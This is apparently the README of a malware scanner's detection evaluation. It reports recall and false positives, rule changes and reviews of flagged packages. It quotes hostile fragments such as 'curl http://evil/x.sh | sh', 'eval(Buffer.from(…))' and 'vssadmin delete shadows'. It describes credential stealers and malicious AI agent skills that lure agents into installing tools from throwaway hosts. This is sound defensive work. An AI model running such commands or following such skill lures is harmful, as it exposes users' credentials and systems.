# Detection eval

`corpus.json` lists labelled samples:

- **malicious**: real packages from the [DataDog malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) (npm, PyPI, VS Code extensions, AI agent skills), picked with a fixed seed, 260 PyPI packages from a second, independent source, [pypi_malregistry](https://github.com/lxyeternal/pypi_malregistry) (`"source": "malregistry"`), and 200 npm packages from a third, [the ASE 2026 npm study](https://doi.org/10.6084/m9.figshare.31869370) (`"source": "npmstudy"`, CC BY 4.0).
- **clean**: popular npm / PyPI packages and VS Code extensions, fetched from the public registries. Several were chosen because they look suspicious on the surface: install scripts that download binaries, local dev servers, SSH tooling, telemetry. Entries with `"set": "random-2026-11"` were not picked but drawn at random from all of npm and PyPI (`eval/sample_clean.py`, see below), `openvsx-random-2026-11` and `openvsx-random2-2026-11` from all of Open VSX. `"source": "skills"` entries are AI agent skills in GitHub repositories, pinned to a commit and fetched with `eval/fetch_skills.py DIR` (`run_eval.py --skills DIR`).

Each sample has a `split`. Rules were tuned while looking at `dev`. `holdout` was added afterwards and never used for tuning, so its numbers are the honest estimate.

```bash
cargo build --release
eval/fetch_malicious.sh ~/kalascan-corpus ~/kalascan-malregistry   # blobless clones
eval/fetch_npmstudy.py ~/kalascan-npmstudy                          # 200 tarballs, read out of a 4.8 GB zip by range requests
python3 eval/run_eval.py --dataset ~/kalascan-corpus --malregistry ~/kalascan-malregistry --npmstudy ~/kalascan-npmstudy --out before.json
# ...change rules...
python3 eval/run_eval.py --dataset ~/kalascan-corpus --malregistry ~/kalascan-malregistry --npmstudy ~/kalascan-npmstudy --compare before.json
```

Every rate is printed with its 95% Wilson interval. `--rule-stats` adds, for each finding, how many malicious and clean packages of a split it fired on and the likelihood ratio between the two. Without `--malregistry` the second source is left out.

**Holdout misses are counted, not listed.** A sample somebody has looked at stops being a holdout sample, so the miss list and the score changes show `dev` only (`--show-holdout` overrides this; move what you then read to `dev`). On 2026-11-17, before this was the default, one run printed the names and rule names of ten missed `malregistry` samples. No rule or weight was changed in response; they stay in the holdout.

The malicious samples are **live malware**. `run_eval.py` scans them statically and extracts archives into a temp dir with the dataset password. Keep the corpus outside the repo. `--flag=--sandbox` executes them; the harness refuses it unless `--disposable-vm` is passed as well, and that flag is a promise: a throwaway VM with no host file sharing (below).

CI (`.github/workflows/eval.yml`) runs only the clean half, as a false-positive gate: `--only clean --max-fpr 0`, on every pull request that touches `src/`, `rules/`, `eval/` or `Cargo.lock` (without the 1,993 packages of `random2-2026-11`, the second Open VSX draw and the AI skills, which the weekly run fetches and scans).

Results at threshold 50 (ruleset 2026.11.11, score model v1, measured 2026-11-20; 95% interval in brackets; the aggregate is in [`results/2026.11.11.json`](results/2026.11.11.json)):

| split | malicious recall | clean false positives |
|---|---|---|
| dev | 691/929 (74%, 71-77) | 0/399 (0%, 0-1) |
| holdout | 659/984 (67%, 64-70) | 0/3,424 (0%, 0-0.1) |
| holdout, packages and extensions (the 2026.11.9 holdout less one sample) | 640/882 (73%, 70-75) | 0/2,664 (0%, 0-0.1) |
| holdout, AI agent skills | 19/102 (19%, 12-27) | 0/480 (0%, 0-0.8) |
| holdout, dated 2026-08-01 or later | 89/195 (46%, 39-53) | |

The holdout fell from 72% to 67% with ruleset 2026.11.10 because a new ecosystem joined it at 19%, not because a package was lost ("AI agent skills", below); the packages and extensions were at 639 of 883 then and are at 640 of 882 now: two more caught, and one sample read and moved to `dev` ("Encoded literals and calls in the data flow", below).

**The last row is the one to expect on new malware.** It is every holdout sample whose file name in the DataDog dataset carries a date of August 2026 or later (`run_eval.py --since 2026-08-01`): 194 npm packages and one PyPI package, from four sets. npm in the holdout dated before August is at 147 of 192 (77%). The gap is what tuning on the same months is worth: the batches the rules were written from are mostly January to June, and so is `fresh2-2026-11`.

Five tuning batches of new samples joined `dev` in November (below), which is why its rate moves with each one.

The holdout by sample set:

| holdout set | what it is | malicious recall |
|---|---|---|
| original | 147 samples: the 27 first ones and 120 added in November 2026 | 107/147 (73%, 65-79) |
| `recent-2026-11` | 60 npm packages dated 2026-08-01 or later, the newest in the dataset | 33/60 (55%, 42-67) |
| `malregistry-2026-11` | 100 PyPI packages from pypi_malregistry whose names the DataDog dataset does not have; 5 archives do not unpack | 83/95 (87%, 79-93) |
| `fresh-2026-11` | 161 packages drawn on 2026-11-18, after ruleset 2026.11.2: 100 npm and 1 PyPI dated 2026-08-01 or later (DataDog), 60 PyPI from pypi_malregistry; 2 archives do not unpack | 90/159 (57%, 49-64) |
| `fresh2-2026-11` | 200 packages drawn on 2026-11-18, before ruleset 2026.11.5: 150 npm dated 2026-01-01 or later (DataDog), 50 PyPI from pypi_malregistry; 4 archives do not unpack, and one sample was read for ruleset 2026.11.11 and moved to `dev` | 155/195 (79%, 73-85) |
| `late-2026-11` | the 26 npm names dated 2026-08-01 or later that were left in the dataset, drawn on 2026-11-18 | 13/26 (50%, 32-68) |
| `npmstudy-2026-11` | 200 npm packages from [the ASE 2026 npm study](https://doi.org/10.6084/m9.figshare.31869370) whose names the DataDog dataset does not have, drawn on 2026-11-19; mostly published 2021-2024 | 159/200 (80%, 73-85) |
| `skills-2026-11` | 102 AI agent skills from the DataDog dataset, split by author from the 102 in `dev`, drawn on 2026-11-20 | 19/102 (19%, 12-27) |

**The holdout number is the one to quote, and the `recent` row is the one to worry about**: on the newest npm malware KalaScan catches about half (24 of 60 with ruleset 2026.11.1, before the tuning described below). The second sources say the rules are not fitted to one dataset's taste: PyPI 87% on pypi_malregistry against 39 of 48 (81%) on the original DataDog PyPI holdout samples; npm 80% on the study's samples against 147 of 192 (77%) on DataDog npm dated before August 2026. Both second sources are older malware, so they do not speak to the newest; the `recent` row does. By ecosystem the whole holdout is IDE extensions 32/48 (67%, 53-78), npm 394/586 (67%, 63-71; DataDog 235/386, the study 159/200), PyPI 214/248 (86%, 81-90), AI agent skills 19/102 (19%, 12-27).

### Encoded literals and calls in the data flow (ruleset 2026.11.11)

Two limits the notes below keep naming: a string no rule can read, and data handed from one function to another.

**Encoded literals.** What `atob('…')`, `Buffer.from('…', 'base64' | 'hex')`, `b64decode('…')`, `bytes.fromhex('…')` and `echo … | base64 -d` decode to, when it is text, is now scanned as code of the file: rules, proximity chains and the data-flow pass, two layers deep, reported on the literal's line (`obfuscator::layers`, `layer_findings`). `eval(Buffer.from(blob, 'base64'))` used to be a lead because a legitimate extension ships the same wrapper; now the payload decides. Character codes handed to a decoder of the package's own, whatever its name (`_d([104,116,116,112,115])`, `String.fromCharCode.apply(null, […])`, decimal or `0x`), are read as the string they spell, next to the `String.fromCharCode(…)` form that already was. The evasion suite went from 147 to 151 of 153: all four `base64-layer` pairs (docs/evasion.md).

**Calls in the data flow.** The pass followed variables inside one file and lost data at every call. Before the walk it now makes two summaries per named function: a function that hands a parameter to a network sink is a sink for that argument (`send(tag, data)` around `req.write(data)`; wrappers of wrappers too), and a call of a function that returns a secret carries it. Around that:

- TypeScript's compiled async arrow functions (`f = (a, b) => __awaiter(void 0, void 0, void 0, function* () {`) are functions, `promise.then((v) =>` binds `v` to what the promise holds, and a line that starts with `.` continues the statement above it.
- `'.ssh'` as a path part of its own (`join(home, '.ssh')`) is a secret source, as `.ssh/` was.
- A value built from a downloaded URL and a stolen body carries the secret; it used to carry whichever came first.
- A name that is the environment itself (`env = process.env`, a parameter being summarised) no longer taints through one field (`env.TOKEN`, `env[k]`); a derived value (`JSON.stringify(env)`, a chunk of it) still does.
- A bug: in a statement that starts with `function` or `async`, a `{` inside the parameter list (`state = {}`) was read as the function's body, which cut the header in two and bound `env = process.env` from a default value.

**Measured against ruleset 2026.11.10 scanned again the same day** (dev 688 of 928, holdout 658 of 985, no clean sample flagged). The first version caught 4 more `dev` samples and 6 more in the holdout, and **flagged 5 of 3,824 clean samples**. All five were read:

- `'.env'` as a secret source, 2: a list of file names to fetch from a GitLab project (`cco`), and a tool that reads its own API key from `.env` and sends it to that API (`mcp-serper-search`). The second is the same data flow as a stealer's. Dropped as a source.
- Summaries for downloads, 2: setuptools' `download_svn(url)` (vendored in a virtualenv that `Walk-The-Loop` ships) and a `curl` wrapper (`cco`) read as running what was fetched. Summaries are now for secrets only.
- The environment handed to a function that reads two variables of it, 1 (`opencode-token-usage-extension`): the alias rule above, and the header bug.
- A return followed two levels made `gethostbyname(get_podman_hostname())` a leak of the environment a helper passes to `podman` (`ansible-core`). What a function returns is followed one level.

The narrowing took the holdout from 6 gains to 2, and at first lost a `dev` sample that was caught before, `@langwatch/server`, which had lost its `Chain: Credential Exfiltration`. Read, the one file of it with an environment read and a request is a bug-report helper that collects secret-looking environment values in order to redact them from the report, so the sample looks caught for the wrong reason. The cause was still a mistake: the alias rule had been applied to derived values too, and with that fixed the sample scores as before.

**After this round: `dev` 691 of 928 (+3), holdout 660 of 985 (+2; packages and extensions 641 of 883), no clean sample flagged, no sample lost** (the final numbers of the ruleset are after the second round, below). The three in `dev`: `@sbxapps/…-fieldservicetools-ui` (every string a `_d([…])` array), `strapi-plugin-hextest` (a `send(tag, data)` wrapper around a raw request) and `env-loader-cli` (secret directories walked and the matches posted to a webhook taken from a downloaded config). The two in the holdout are PyPI samples of the original set, both by `Chain: Credential Exfiltration`. Twelve samples that were caught already score higher. The slice dated August 2026 or later did not move (89 of 195).

**What this says about the pass.** Of the 236 `dev` misses, 13 hold a secret read and a network call in one file, and 7 of those are extension bundles over the 64 KB the pass reads. That is the ceiling, and it is low: most misses are not a flow inside one file. Still through in `dev`: `prettier-logger` (reads `.env` and walks the home directory; caught only while `.env` was a source), an n8n community node that collects the environment, SSH keys and cloud metadata credentials and hands them back as the node's output, with no network call of its own (`n8n-nodes-format-utils`), and an install script that writes the same collection to a file n8n can read (`n8n-nodes-text-helpers`).

**The harness.** `fetch_npmstudy.py` wrote each tarball in place; a run killed half-way (the VM ran out of memory more than once) left a truncated file that the next run took for fetched, and the evaluation stopped on it. It now extracts aside and renames.

### Reading what the watch flagged (ruleset 2026.11.11, second round)

**The data.** One day of `kalascan watch` on both feeds (below): 21,257 new releases scanned, npm 16,061 and PyPI 5,196, and 574 of them at risk 50 or more. Those 574 were scanned again with three binaries. Ruleset 2026.11.10 flags 533. The first version of 2026.11.11 (the section above, which flagged no clean sample of the corpus) flags 569: 41 that 2026.11.10 does not, nearly all through the new data-flow summaries. The clean corpus had not shown that, and would not have.

**Where the findings sit.** In 247 of the 569 every chain or critical finding is in the package's own source, in 219 in build output (`dist/`, bundles), in 33 in tests or fixtures, and in 10 in a bundled dependency (`node_modules`, `vendor`, `site-packages`); the rest are mixed. Fingerprinting known libraries, which was the plan for extension false positives, would reach those 10. It was not built.

**What they are.** About sixty were read, by class, as the source and sink lines of their chains, and as many again as one-line contexts. None read as malware: agent CLIs, installers, SDKs, some of which do risky things by design. The classes, and what changed:

- **One setting read from the environment**, about 120 releases (`Chain: Credential Exfiltration` from the data-flow pass): `const env = options.env ?? process.env; const base = baseUrl(env); fetch(base + …)`, `fetch(\`http://127.0.0.1:${portOf(process.env)}/…\`)`, `env = dict(os.environ); endpoint = env.get(…)`, `process.env?.NAME`. The pass treated anything computed from the environment as the environment. Now the environment mapping (itself, a copy, an object with it inside) counts where it is serialised or handed to a sink; a field read from it, or a call of a helper with it, is one setting. A helper of the same file that returns what it collected from its argument still carries it. A route decorator (`@router.post('/hook/' + slug)`) is not a request.
- **A process started with downloaded data**, about 50 (`Chain: Download and Execute` from the data-flow pass): an update check that runs `npx pkg@<version from the registry>`, a script for `node -e` kept in a string that itself calls `fetch`. `spawn` and its relatives now count like Python's `subprocess`, only with an inline-code flag or a shell, and a `fetch(` inside a string literal is not a download.
- **Official installers**, the most common download cradle by far: `curl -fsSL https://claude.ai/install.sh | bash` and its like for eighteen agent CLIs and developer tools, in packages that install or document them. Their domains joined the vendor list. A bug besides: a vendor URL with no path (`https://sh.rustup.rs | sh`) was not recognised, because the host was read up to the next `/`.
- **Install-time chains across unrelated files**, more than a hundred: a `postinstall` that removes a file, and somewhere else in the package an installer URL in a help text or a `daemon install` command that writes a systemd unit. Three findings (`Remote Executable Download`, the download cradle, `Systemd User Service Installed`) now make an install-time chain only in what the hook runs: the manifest, a file its command names, or a file named for the job. The other channels still pair across the package: measured on the corpus, 12 holdout samples have their install-time chain's second finding in a file the hook does not name, and none of those is one of the three. A `package.json` deeper than one directory (a template the package ships) is not the install hook, and a file called `setup.py` is one only if it calls `setup(` (`pkg/tunnels/setup.py` is a module).
- **Credentials in fixtures**: an AWS key pair is two critical rules and so a verdict; the three leak rules now count as one critical finding together.
- **Smaller ones**: a bidi control alone between quotes (`const RLO = '\u{202E}'`) or the isolates localisation libraries put around values; `exec(b64decode('" + payload + "'))` built as a command for another host, like the `{placeholder}` form before; `net localgroup` in a syntax highlighter's keyword list.

**Measured.** Of the 574, **360 still reach 50** (533 with ruleset 2026.11.10, 569 with the first version): about 1.7% of the day's releases instead of 2.7%. What is left is mostly by design or unread: packages that do pipe a script from their own repository into a shell, 114 with `Chain: Download and Execute`, 89 with `Chain: Credential Exfiltration`, 58 with an install-time chain in what the hook runs.

On the corpus, against the first version: no verdict changes except one. Holdout 659 of 984, `dev` 691 of 929, no clean sample flagged (3,823 scanned; `jax-gemini` 0.1.1, a random PyPI package, is gone from PyPI since the day before).

**What the holdout cost.** The first run of this round lost three holdout samples (657 of 985). Two went with a scoring change that was then dropped: a critical rule counted once per package however many files it fires in. On the live data that looked right (the same line in the CommonJS and the ESM build); on the holdout the one rule left on the two samples was `VS Code Session/Token Stealing` and `Buffer Decode + eval`, in two files each, and that is what catches them. The third lost its only chain to the vendor list. To see which host, it was read: `openclaw-droid` 1.0.1, whose install script pipes NodeSource's setup script into bash, which is what the scanner had caught it for. It moved to `dev`, where it is now a miss; the vendor list stayed. Three `dev` samples lost in the same run came back with narrower versions (the `setup(` test instead of a depth limit, the helper that returns its argument).

**A bug the feed found.** npm's `0.0.0-stage` placeholders, about 1% of the feed, have a directory entry whose size field is empty. GNU tar and npm read that as 0; the `tar` crate refused the archive, so KalaScan could not scan any tarball with one. The stream is now patched on the way in.

### What the registries publish today: a prospective run (started 2026-11-20)

Every number above is about malware somebody had already caught (Known limits in docs/methodology.md, 7). The other measurement is to score releases on the day they are published and look later at what became of them.

**How.** `kalascan watch --log FILE` appends one JSON line per release it scans, flagged or not: time, target, risk, strong findings, ruleset. `eval/watch_outcome.py LOG… --min-age 30` takes the releases scanned at least 30 days ago, asks OSV for a malicious-package record of each (`MAL-…`, the OpenSSF malicious-packages feed, which takes in the registries' own removals) and, for the flagged ones without a record, asks the registry whether it still serves them. It prints how many flagged releases were later named malicious, are gone, or are still up; of the releases later named malicious how many had been flagged, with a Wilson interval; and how long before the OSV record the scan ran.

**What the outcome can and cannot say.** A release nobody has named counts as not malicious, so "flagged, still up" is an upper bound on false positives, and the recall is on malware found within the wait. "Gone" is weaker than a record: authors unpublish too. The npm feed is scanned at each package's `latest`, so a malicious version replaced within a poll is not seen.

**First reading, 2026-11-20, ruleset 2026.11.10.** 2 hours 17 minutes of both feeds, in the evaluation VM: 4,242 releases scanned (npm 2,708, PyPI 1,534). **106 scored 50 or more (2.5%, 2.1-3.0)**: npm 51 (1.9%), PyPI 55 (3.6%); 79 of the 106 carry a chain. None was read. Hours later OSV names none of the 4,242 and all 106 are still up, which says nothing yet: takedowns take days. The rate is three to five times the first-contact rate on random packages (0.7%): what is published in a given hour is agent CLIs, installers and large applications, not the long tail the random draws are made of. A day later 574 of 21,257 had reached 50; they were read by class and are the subject of the section above. They are not holdout samples.

**What the feed showed about the scanner.** 110 scans failed. 50 archives were over the size or file-count limits. 33 releases were gone (404) before the scan. 26 were npm's `0.0.0-stage` placeholders, whose tarball has a directory entry with an empty size field: GNU tar and npm read that as 0 and the `tar` crate refuses it, so KalaScan could not unpack any tarball that has one (fixed since; `kalascan guard` fails closed on a package it cannot scan, so it had blocked installs rather than waved them through). One watch was killed by the kernel when the 4 GB VM also ran an evaluation (a watch with two jobs holds 0.7 to 0.9 GB after an hour), so the watches run under a restart loop; a restart starts again from the feed's head, and the gap is not scanned. The watch was also stopped for some hours on 2026-11-21 while the corpus was measured. Each log line names the ruleset and, since that day, the detection fingerprint of the binary that scored it; lines of 2026-11-20 marked 2026.11.11 are from the first version of that ruleset.

### AI agent skills (ruleset 2026.11.10)

**The samples.** The DataDog dataset has 204 malicious AI agent skills (`samples/ai-skills/`, a directory with a `SKILL.md`, most of them from ClawHub). `sample_malicious.py --ecosystem ai-skills --seed 20261128` split them by author: 102 into `dev` (`tune-skills-2026-11`), 102 into the holdout (`skills-2026-11`). The clean side has no registry: skills live in GitHub repositories. `sample_clean.py --skills` draws them from GitHub code search (`filename:SKILL.md`, by file-size bucket because search returns at most 1,000 hits a query; one skill per repository; seed 20261128) and pins each to a commit; `--skills-repo` lists every skill of a repository. 320 were drawn (`skills-random-2026-11`), one dropped because its repository is a malicious sample's, plus 168 from nine vendor repositories (`skills-picked-2026-11`: Anthropic, OpenAI, Hugging Face, Sentry, Trail of Bits, Cloudflare, obra/superpowers, Vercel, Supabase). `fetch_skills.py` fetches each directory with a shallow, blobless git fetch and a sparse checkout, symlinks written as plain files; `run_eval.py --skills DIR` scans them. A skill whose `SKILL.md` is at a repository's root is the whole repository.

**First contact, ruleset 2026.11.9: 9 of 204 malicious skills (4%), 6 of 487 clean (1.2%, 0.6-2.7).** KalaScan already read `SKILL.md` as instructions (hidden text, steering, payload commands), and almost none of these skills does any of that.

**Reading the `dev` misses.** 44 of the 100 `dev` misses are one lure: the skill does what its name says and adds a setup step, "⚠️ ToolCLI must be installed before using this skill. Download and install (Windows, MacOS) from: https://toolcli.vercel.app/", or "Visit [this page](https://glot.io/snippets/…) and execute the installation command in Terminal", or a GitHub release zip "(extract using pass: `openclaw`)". The payload is the tool, not the skill. Two findings, both chains (decisive), in agent files only:

- `Chain: Agent Setup from Throwaway Host`: an install, download, run or visit instruction on one line with a URL on free app hosting (`*.vercel.app`, `*.netlify.app`, `*.pages.dev`, `*.glitch.me`, …), a `.forum` domain or a paste site (`glot.io`, `pastebin.com`, `rentry.co`, …).
- `Chain: Agent Setup from Password-Protected Archive`: a `.zip`, `.7z` or `.rar` with its password beside it.

Tried first as a regex over the samples: 44 of the 100 `dev` misses, 0 of 559 agent files in the clean skills. The rest of the `dev` misses (56) has no common shape: guides on game anti-cheat bypasses and Reddit account farming, skills that clone a repository and run it, skills whose malicious part is in a script KalaScan scores below 50. Several read as benign.

**After: 65 of 204 (32%).** `dev` 46 of 102 (45%, 36-55), **holdout 19 of 102 (19%, 12-27)**. The holdout rose from 7; the lure is less common there because the split is by author and two authors carry most of it in `dev`. Of the 6 clean skills flagged at first contact, all whole repositories with a root `SKILL.md`, one was fixed: `Shadow Copy Deletion` matched the name `vssadmin` in an EDR detection list and now needs the destructive verb (`vssadmin delete shadows`, `wmic shadowcopy delete`, `recoveryenabled no`). The other five keep generic code findings (a self-installer piped to `bash`, a test with `curl http://evil/x.sh | sh`, a browser wallet extension's cookie read and fetch, `eval(Buffer.from(…))` in a reverse-engineering tool, a build script that downloads an installer) and are left out of the corpus, as before; the fixed one and one more that scored 30 moved to `dev`. With the fixes all 480 clean skills left score below 50.

**What this does not cover.** Skills are scored with the package rules plus the agent-file checks. A skill that tells the agent to do something harmful in plain words, with no URL, command or credential path, is not caught; nor is a payload that the skill fetches from a domain of its own.

### Random IDE extensions, a second draw (ruleset 2026.11.10)

**The draw.** `sample_clean.py --openvsx --seed 20261127 --size 300 --draws 520` on 2026-11-20, pinned the same way as the first draw (newest universal version before 2026-05-16): 310 had such a version, 297 were new to the corpus (`openvsx-random2-2026-11`). 2 cannot be scanned (more than 10,000 files).

**First contact, ruleset 2026.11.9: 15 of 295 (5.1%, 3.1-8.2)**, twice the first draw; both draws together 21 of 542 (3.9%, 2.5-5.9). All 15 were read.

- **Fixed, 9.**
  - `Trojan Source Bi-Directional Character`, 2: bytes that decode to a bidi control in a `.wasm` file and in a PHP phar, and Carbon's language list, where U+202B opens a name in Arabic script. A line with a NUL or an invalid byte is binary, and a bidi control followed by an Arabic or Hebrew letter is right-to-left text; neither counts now.
  - `Code Hidden Behind Whitespace Padding`, 1: sql.js's `sql-asm-debug.js`, 5.6 MB of debug asm.js with 1.4 MB of indentation in 9,110 runs of at most 291 bytes. Only runs of 4 KiB or more count toward the finding now; `utils-mf`'s padding is one run of megabytes.
  - Obfuscated string tables, 2: `iex` matched inside a random fragment (`XiExy`), and the credential step matched `withCredentials` and `credentials` (fetch and XHR options) and, in the other extension, mime-db's type table bundled as one JSON string. A three-letter needle now has to be a word, the two options alone are not a credentials file (`/.aws/credentials` still is), and a JSON object of 1 KiB or more in the table is data.
  - `Download Cradle` and `Chain: Download and Execute`, 3: official installers (`wasmtime.dev`, `openclaw.ai`, SAP's `SAP-samples` organisation on GitHub), added to the vendor list.
  - `Repackaged Copy of Popular Extension`, 1: the repository's owner publishing under a second id (`msrivastav13` for `mohithshrivastava.dx-code-companion`). The publisher equal to the repository's owner no longer counts as someone else.
- **Flagged as before, 6.** Each does what the finding says: two forks republished under another publisher with the original repository (`RunOnSave`, CodeTour as `tutorialkit`); two that call `vscode.authentication.getSession` and send requests (one for its own sign-in provider, one asking the user); a security scanner whose rule descriptions quote `eval(Buffer.from(…))`; an extension that bundles a GitHub token and tells the user to pipe an install script to `bash`. Left out of the corpus.

The 9 fixed extensions moved to `dev`; with the fixes all 280 left in the holdout score below 50. The first draw's 241 and the 2,665 clean holdout packages stayed at 0. In the corpus as it was for ruleset 2026.11.9, 8 scores moved (6 clean, 2 malicious) and none crossed 50: holdout 639 of 883 as before.

### A new npm tuning batch, and exact-pinned siblings measured and not built (ruleset 2026.11.10)

**The batch.** `tune-npm2-2026-11`: 200 npm packages dated January to July 2026 that the corpus did not have (`sample_malicious.py --ecosystem npm --since 2026-01-01 --before 2026-08-01 --size 200 --seed 20261128`), split `dev`. Scanned once with ruleset 2026.11.10: **152 of 200 (76%, 70-81)**. The 48 misses, read: 10 hijacked `@mastra/*` releases whose payload is a dependency (`easy-day-js`, below; the registry's young-dependency check is the scan that can see it, and it does not run on an archive); about 7 with no code to read (platform binaries, placeholders); 4 install-time stealers that read SSH keys, `.env` files, the environment and cloud metadata (`169.254.169.254`) and post them to a server of their own with `http.request`, one with every string built from char-code arrays; the rest one of a kind. The largest group cannot be reached from the package's files, and the stealers' reads (cloud metadata, `~/.ssh`) are what AWS and Google SDKs and git tooling read too, with no clean-side measurement to say how often; no rule was written from this batch.


The replay of ruleset 2026.11.7 (below) found that allowing siblings would reach up to 10 more holdout misses, and left the clean side unmeasured. Campaigns like `@toptal/picasso-*` pin their siblings to exact versions (`100.0.1`), so the narrowest widening is siblings pinned to an exact version, scanned at that version. Measured both ways (`sibling.py`, not committed). Clean: the 1,389 clean npm packages, each version's registry document, at most three such siblings per package: 56 packages have some, 109 sibling scans, highest score 37, none at 50. Malicious: the pinned sibling exists in the dataset at that exact version for 6 `dev` and 11 holdout misses, and none of those copies scores 50 or more. The earlier replay matched a dependency that is a sample by name, at whatever version the dataset holds; at the pinned version nothing is left to catch. The widening would cost nothing on the clean side and catch nothing that can be measured, so it was not built.

### Random IDE extensions (ruleset 2026.11.9)

**The draw.** Every random clean sample so far was an npm or PyPI package. `sample_clean.py --openvsx` draws extensions from the 21,685 in Open VSX's sitemap (its search API stops at offset 10,000) and pins each to its newest universal version published before 2026-05-16, the same cutoff as the packages. Seed 20261125, 300 wanted, 420 drawn: 171 had no version that old, 249 went into the holdout as `openvsx-random-2026-11`. One could not be scanned.

**First contact, ruleset 2026.11.8: 7 of 248 at risk 50 or more.** All seven were read:

- **Not clean, 1.** `hdev.hello-developer-copilot` ships a Cursor `sessionEnd` hook (`.cursor/hooks/…runtime.cjs`) that XOR-decodes a script and runs it through `new Function("require", …)`. Decoded as text, the script posts the first 500 characters of the user's prompt, the session ID and the project path to a company's audit endpoint, TLS verification off. It is an internal compliance tool published to a public registry; for anyone else who installs it, it is a hidden prompt reporter. KalaScan flagged it for the obfuscation and the decode-and-run, which is what it does. Left out of the corpus.
- **Fixed, 3.**
  - `Repackaged Copy of Popular Extension`, 2. `wangpenglong.helloworld-sample` keeps `github.com/microsoft/vscode-extension-samples` as its repository, as every extension generated from a sample does; that repository was in the popular list because one popular extension declares it. Removed from the list, and the generator skips it. `doutriauxguillaume.name-that-color` is the author of `guillaumedoutriaux.name-that-color` on Open VSX under the handle reordered; a publisher that is a rotation of the popular publisher no longer counts as someone else.
  - `Chain: Reconnaissance Beacon`, 1. `devoszhang.uix` (an internal tool) reads `os.hostname()` for an export file 3,400 lines below the intranet IP addresses of its API config, in one bundle. Host reconnaissance and a hardcoded IP URL now make a beacon only in one file and at most 200 lines apart; the other beacon targets (exfiltration services, webhooks, a DNS name built from data) still pair across the package. Holdout count unchanged (639); `dev` unchanged after the harness fix below.
- **Flagged as before, 3.** Each does what the finding says:
  - `chrisatcursor.mssql`: Microsoft's SQL Server extension republished under another publisher, for editors the Marketplace licence excludes. `Repackaged Copy of Popular Extension` is right about it; nothing says the copy is malicious, and nothing in a scan can, short of comparing it with the original.
  - `anshuman55a.usagedock`: an AI usage dashboard. It reads the sign-in tokens of five AI tools (a GitHub session for Copilot, Windsurf's key from its local database, Codex, Gemini and Claude credentials) and sends each to its own provider. That is what a token stealer does, apart from where the tokens go, and the scanner does not resolve where each request goes.
  - `nextgencode.ngc-commitguard`: the bundled Resend SDK reads its API key from the environment and sends it with `fetch` (`Chain: Credential Exfiltration` from the data-flow pass); the extension also lists its own install directory under `~/.vscode/extensions/`.

  As with `debi` and `@aandrian/ocr4` in the draw below, they are left out of the corpus: kept as clean samples they would fail the CI gate on every run, and an exception for their names would teach the rules nothing. They stay in the first-contact count.

One pattern in the rules was too wide and is narrowed: `Password Manager Access` matched `Credentials.dat` inside `connectionCredentials.database`.

**That is 6 false positives in 247 random extensions at first contact (2.4%, 1.1-5.2)**, against 0.7% for random packages. An extension carries its bundled dependencies, so each scan reads more code. The 3 fixed extensions moved to `dev`; with the fixes all 244 left score below 50.

**The harness.** The first full run with these changes lost one `dev` sample, `perfkitbenchmarker` 9.9.9. Read, it was never caught for the right reason: the archive holds the malicious package next to the source it imitates, both with a manifest at the same depth, and `package_root` scanned whichever came first, the source. A hostname read in one file and a test fixture's IP in another made the beacon. A tie now scans the common parent; in the rerun that sample is caught by its `setup.py` (recon and the callback IP eleven lines apart), and no other count moved.

**Opt-in passes, measured once** (ruleset 2026.11.8, every sample): `--deobfuscate`, `--emulate` and `--deep-triage` change no count at 50 or 70. At 30, `--deobfuscate` flags 33 clean packages instead of 13 (and one more malicious), `--emulate` 16. They make a finding easier to read; they do not change the verdict.

**How far the dependency check should reach, replayed.** The shipped check scans dependencies first published at most 30 days before the package, not siblings, one hop. Replayed on the dataset alone (`depdepth.py`, not committed: each npm sample's declared dependencies that are themselves samples, scanned from their dataset copy, ruleset 2026.11.8): of the holdout misses, 43 of 151 declare a dependency that is malware in the dataset, 22 of those dependencies score 50 or more, and the shipped rule reaches 12 of them, the same 12 the registry replay of ruleset 2026.11.6 found. Dropping the age limit adds up to 10 (a dependency first published long before, such as the `@toptal/picasso-*` packages hijacked together), allowing siblings adds up to 10, mostly the same ones, and a second hop adds none. Both would scan far more dependencies of every clean package, and a sibling of a clean package is usually its own monorepo; the clean side of that was not measured, so nothing was changed.

### Packages nobody picked, a larger draw (ruleset 2026.11.8)

The false-positive rate rested on 595 random packages. 2,000 more were drawn on 2026-11-19, the same way and with the same cutoff (`sample_clean.py --seed 20261124 --size 1000 --draws 2200`, below): 1,000 npm and 999 PyPI, all in the holdout. 6 could not be scanned. First contact, ruleset 2026.11.8 before the fixes below: **18 of 1,993 at risk 50 or more**. Read, they were:

- 4 registry spam publishers (`Chain: Registry Spam Publisher`: a script that publishes copies under random names, as `democratic_trout_z3n` in the first draw). Not clean; left out of the corpus.
- 12 false positives, fixed:
  - `Chain: Credential Exfiltration` from the data-flow pass, 5: `mock.patch("…os.environ", …)` in a test read as an HTTP PATCH (django-cronman, everysk-lib, python-tripleoclient); a test server started with `Popen(cmd, env=env)`, whose handle was then taken to hold the environment (nbclassic); a `~/.ssh/id_rsa.pub` public key sent to Vault to be signed (unskript).
  - `Crypto Wallet Access`, 4: copies of a wallet-connector library that links to MetaMask's Chrome Web Store page, whose URL holds the extension ID.
  - official installers, 2: ollama.com's install script (HOS-ME) and cmake.org's in a vendored Dockerfile (pyscamp). Both hosts joined the vendor list.
  - `Chain: Install-time Persistence` and `Chain: Install-time Exfiltration`, 1: `systemctl --user enable` printed with `console.log` as advice to the user, and an optional Telegram alert URL in a comment, its token written as `<TOKEN>` (whatnext-ai). A Telegram URL with such a placeholder no longer counts for install-time exfiltration. The first version of this fix dropped the Telegram API host from the chain altogether, as for the reconnaissance beacon; that cost one holdout sample (639 → 638, an install-time stealer whose token is not in the code), so it was narrowed to the placeholder. This is the holdout count steering a rule, and is on record as such.

  One carried a second finding that the first rerun showed: unskript also matched `nested b64decode` on `base64.b64decode(base64_bytes)`, a variable name, and the rule now needs a second `base64.` call.
- 2 left as they are, and out of the corpus: `debi` installs `.deb` files it downloads from a personal Heroku host with `dpkg -i` (download and execute, as the finding says), and `@aandrian/ocr4` is one obfuscator.io file run through `eval` (an ID-card OCR client, by its string table). Both are behaviours KalaScan flags by design; kept as clean samples they would fail the CI gate on every run.

